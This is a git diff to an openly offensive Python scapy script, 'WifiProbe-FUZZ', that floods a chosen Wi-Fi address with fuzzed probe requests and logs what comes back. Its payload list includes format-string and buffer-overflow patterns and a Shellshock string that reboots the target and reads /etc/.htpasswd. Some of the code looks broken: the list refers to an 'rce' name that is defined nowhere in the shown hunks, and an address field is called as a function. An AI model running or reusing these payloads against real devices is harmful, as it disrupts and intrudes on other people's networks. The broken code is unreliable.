@@ -7,6 +7,8 @@ from scapy.all import *
 logfile = "wifiprobe.txt"
 interface = "mon0"
 		
+
+
 def banner():
   print("WifiProbe-FUZZ -- v1.1 (Red Dragon Productions)")
   print("")
@@ -18,8 +20,11 @@ def banner():
   print("Usage: ")
   print("python2 wifi_probe.py")
 
+#Main Start
 banner()
-targets = raw_input("SSID> ")
+server = str(raw_input("SSID> "))
+targ_server = str(server)
+print("Negotiating with " + str(targ_server) )
 
 def engine():
   for i in range(1,256):
@@ -30,7 +35,7 @@ def engine():
     bonull  = ["00"*i]
     bofull  = ["FF"*i]
     sshock  = ["env x='() { :;}; reboot' bash -c cat /etc/.htpasswd"]
-    exploits = [fmts, rc, io, bonull, bofull, sshock]
+    exploits = [fmts, rce, io, bonull, bofull, sshock]
     for x in exploits[:]:
       tofuzz = [
         "Dot11Elt(ID="+str(x)+", info='00')", 
@@ -60,22 +65,24 @@ def engine():
         exfile.write(str(a))
         srpflood(
           RadioTap()/
-          Dot11(type=0,subtype=0100,addr2=targets)/
+          Dot11(type=0,subtype=0100,addr2=targ_server)/
           Dot11ProbeReq()/
           a)
-
-#Threads
 
 def getresp(p):
   logfile = open("log.txt","a")
   dframe = (5,5)
   if p.haslayer(Dot11):
+    if p.addr2(targ_server):
       if p.type == 0 and p.subtype in dframe:
         d = str(p)
         logfile.write(str(d)+"\n")
         print(hexdump(d))
-  
+
+
+#Start the engine
 t = threading.Thread(target = engine)
 t.start()
 
+#Sniff the data
 sniff(prn=getresp)
